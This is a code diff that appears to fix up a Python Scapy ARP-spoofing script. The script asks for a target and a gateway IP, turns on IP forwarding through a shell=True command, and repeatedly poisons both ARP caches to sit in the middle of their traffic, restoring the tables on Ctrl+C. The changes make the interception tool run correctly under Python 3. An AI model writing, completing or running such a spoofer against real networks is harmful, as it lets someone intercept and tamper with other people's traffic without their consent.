@@ -1,9 +1,10 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # echo 1 > /proc/sys/net/ipv4/ip_forward To allow packets to flow through, just like a router
 
 import scapy.all as scapy
 import time
 import subprocess
+import sys
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -28,9 +29,11 @@ def restore(destination_ip, source_ip):
     # print(packet.summary())
     scapy.send(packet, count=4, verbose=False)
 
+
 target_ip = input("target ip: ")
 gateway_ip = input("gateway ip: ")
 subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
 
 try:
     sent_packets_count = 0
@@ -39,6 +42,7 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("[+] Detected  CTRL + C ...... Resetting ARP tables..... Please wait.\n")
